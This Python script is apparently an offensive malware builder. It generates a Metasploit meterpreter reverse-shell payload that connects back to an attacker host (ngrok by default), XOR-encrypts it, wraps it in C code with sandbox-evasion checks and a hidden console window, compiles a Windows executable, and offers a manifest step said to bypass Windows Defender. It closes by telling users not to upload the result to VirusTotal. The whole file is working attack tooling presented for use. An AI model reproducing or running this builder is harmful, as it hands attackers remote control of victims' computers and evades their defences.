#!/usr/bin/env python3
# -*- coding: utf8 -*-

import random
import string
import argparse
from Crypto.Hash import MD5
import os
from termcolor import colored


shellcode_output = "./result/test.raw"


def banner():
	return """
  _    _            _      _______ _           __          __        _     _ 
 | |  | |          | |    |__   __| |          \ \        / /       | |   | |
 | |__| | __ _  ___| | __    | |  | |__   ___   \ \  /\  / /__  _ __| | __| |
 |  __  |/ _` |/ __| |/ /    | |  | '_ \ / _ \   \ \/  \/ / _ \| '__| |/ _` |
 | |  | | (_| | (__|   <     | |  | | | |  __/    \  /\  / (_) | |  | | (_| |
 |_|  |_|\__,_|\___|_|\_\    |_|  |_| |_|\___|     \/  \/ \___/|_|  |_|\__,_|
																			 
																			 
"""


def random_string(length=10):
	# Return 11 character string where the first character is always a letter
	return f"{random.choice(string.ascii_lowercase)}{''.join(random.choices(string.ascii_lowercase + string.digits, k=length))}"


def xor(data_as_bytes, key):
	key_length = len(key)
	key_int = list(map(ord, key))
	return bytes(((data_as_bytes[i] ^ key_int[i % key_length]) for i in range(len(data_as_bytes))))


def writetofile(data, key, output_file):
	shellcode = "\\x"
	shellcode += "\\x".join(format(b, "02x") for b in data)

	names = [random_string() for _ in range(10)]

	if shellcode:
		try:
			with open(output_file, "w+") as f:
				shellcode_lines = []
				shellcode_lines.append("#include <windows.h>\n#include <stdio.h>\n\n")
				shellcode_lines.append(f"BOOL {names[8]}() {{\nint Tick = GetTickCount();\nSleep(1000);\nint Tac = GetTickCount();\nif ((Tac - Tick) < 1000) {{\nreturn 0;}}\nelse return 1;\n}}\n\n")
				shellcode_lines.append(f" int main () {{ \n HWND hWnd = GetConsoleWindow();\nShowWindow(hWnd, SW_HIDE);\nHINSTANCE DLL = LoadLibrary(TEXT(\"{names[2]}.dll\"));\nif (DLL != NULL) {{\nreturn 0;}}\n")
				shellcode_lines.append(f"if ({names[8]}()) {{char * {names[4]} = NULL;\n{names[4]} = (char *)malloc(100000000);\nif ({names[4]} != NULL) {{\nmemset({names[4]}, 00, 100000000);\nfree({names[4]});\n")
				shellcode_lines.append(f"\nchar {names[3]}[] = \"{shellcode}\";")
				shellcode_lines.append(f"\n\nchar {names[7]}[] = \"{key}\";")
				shellcode_lines.append(f"char {names[5]}[sizeof {names[3]}];\nint j = 0;\nfor (int i = 0; i < sizeof {names[3]}; i++) {{\nif (j == sizeof {names[7]} - 1) j = 0;\n{names[5]}[i] = {names[3]}[i] ^ {names[7]}[j];\nj++;\n}}\n")
				shellcode_lines.append(f"void *{names[6]} = VirtualAlloc(0, sizeof {names[5]}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy({names[6]}, {names[5]}, sizeof {names[5]});CreateThread(NULL, 0,{names[6]}, NULL, 0, NULL);\n\nwhile (1) {{\nif (!{names[8]}()) {{ return 0; }}\n}}\n}}\n}}\n}}\n")
				f.writelines(shellcode_lines)
			print(color(f"[+] Encrypted Shellcode saved in [{output_file}]"))
		except IOError as e:
			print(color(f"[!] Could not write C++ code to [{output_file}]"))
			raise SystemExit(e)


def color(string, color=None):
	attr = []
	attr.append("1")

	if color:
		if color.lower() == "red":
			attr.append("31")
		elif color.lower() == "green":
			attr.append("32")
		elif color.lower() == "blue":
			attr.append("34")
		return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)

	else:
		if string.strip().startswith("[!]"):
			attr.append("31")
			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
		elif string.strip().startswith("[+]"):
			attr.append("32")
			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
		elif string.strip().startswith("[?]"):
			attr.append("33")
			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
		elif string.strip().startswith("[*]"):
			attr.append("34")
			return "\x1b[%sm%s\x1b[0m" % (";".join(attr), string)
		else:
			return string


if __name__ == "__main__":
	os.system("clear")
	print(color(banner(), "green"))
	print(
		color(
			"""
███████╗ ██████╗██████╗ ██╗██████╗ ████████╗	~ Script By SKS  ☪ ~
██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝    ~ Revised for Python3 by nimxj ~
███████╗██║     ██████╔╝██║██████╔╝   ██║   
╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
███████║╚██████╗██║  ██║██║██║        ██║   
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
											
""",
			"blue",
		)
	)

	payload_type = input(color("[?] Enter Payload TYPE [tcp,https,tcp_dns]: "))
	# If payload_type==None, default to "tcp"
	payload_type = payload_type or "tcp"
	print(color("[+] Payload TYPE : " + payload_type))

	lhost = input(color("[?] Enter LHOST for Payload [LHOST] : "))
	# If lhost==None, default to "0.tcp.ngrok.io"
	lhost = lhost or "0.tcp.ngrok.io"
	print(color("[+] LHOST for Payload [LPORT] : " + lhost))

	lport = None
	while not lport:
		lport = input(color(" [?] Enter LPORT for Payload : "))
	print(color("[+] LPORT for Payload : " + lport))

	raw_payload = (f"msfvenom -p windows/x64/meterpreter_reverse_{payload_type} LHOST={lhost} LPORT={lport} EXITFUNC=process --platform windows -a x64 -f raw -o ./result/test.raw")

	print(color("[✔] Checking directories...", "green"))
	
	os.makedirs("./result", exist_ok=True)
	print(color("[+] Creating [./result] directory for resulting code files", "green"))
	os.system(raw_payload)

	try:
		with open(shellcode_output, encoding="utf-8", errors="ignore") as shellcode_output_handle:
			shellcode_bytes = bytearray(shellcode_output_handle.read(), "utf8")
			print(color(f"[*] Shellcode file [{shellcode_output}] successfully loaded"))
	except IOError as e:
		print(color(f"[!] Could not open or read file [{shellcode_output}]"))
		raise SystemExit(e)

	print(color(f"[*] MD5 hash of the initial shellcode: [{MD5.new(shellcode_bytes).hexdigest()}]"))
	print(color(f"[*] Shellcode size: [{len(shellcode_bytes)}] bytes"))

	master_key = input(color(" [?] Enter the Key to Encrypt Shellcode with : "))
	print(color(f"[+] XOR Encrypting the shellcode with key [{master_key}]"))
	transformed_shellcode = xor(shellcode_bytes, master_key)

	print(color(f"[*] Encrypted shellcode size: [{len(transformed_shellcode)}] bytes"))

	# Writing To File
	print(color("[*] Generating C code file"))
	source_file = f"./result/final_{lport}.c"
	writetofile(transformed_shellcode, master_key, source_file)

	# Compiling
	exe_name = f"./result/final_{lport}"
	print(color(f"[+] Compiling file [{source_file}] with Mingw Compiler "))

	compilation_string = f"x86_64-w64-mingw32-gcc {source_file} -o {exe_name}.exe"
	os.system(compilation_string)

	print(color("[+] Compiled Sucessfully"))
	print(color("[+] Removing Temp Files"))
	os.remove("./result/test.raw")
	os.remove(source_file)

	manifest = f"wine mt.exe -manifest template.exe.manifest -outputresource:{exe_name}.exe;#1 "

	while generate_manifest:= input(color("[*]Do you want to add Manifest (Generally Bypasses Windows Defender)? (Y/N) ")).lower().strip():
		if generate_manifest not in ("y", "n"):
			print(color("[!] Answer must be 'Y' or 'N'"))
			continue
		else: break

	# Display Results
	print(color(f"\n{'='*36} RESULT {'='*36}\n"))

	if generate_manifest == "y":
		print(color("[+] Adding Manifest"))
		os.system(manifest)
		print(color(f"[+] Final File with Manifest [{exe_name}.exe]"))
	else:
		print(color(f"[+] Final File [{exe_name}.exe] "))

	print(color("\n DO NOT UPLOAD ON VIRUS TOTAL \n", "red"))
	print(color('\n USE "nodistribute.com "\n', "green"))
	print(color("\n Happy Hacking \n", "green"))
